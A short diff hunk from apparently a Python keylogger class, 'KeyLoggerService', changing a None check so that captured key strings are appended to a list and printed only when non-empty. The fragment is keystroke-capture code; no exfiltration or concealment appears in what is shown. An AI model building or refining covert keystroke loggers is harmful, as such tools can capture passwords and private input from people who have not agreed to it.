@@ -16,7 +16,7 @@ class KeyLoggerService(IKeyLogger):
                 return
 
             key_str = key.char if hasattr(key, 'char') else str(key)
-            if key_str is not None:
+            if key_str:
                 self.list_data.append(key_str)
                 print(f" pressed  : {key_str}")
         except Exception as e:
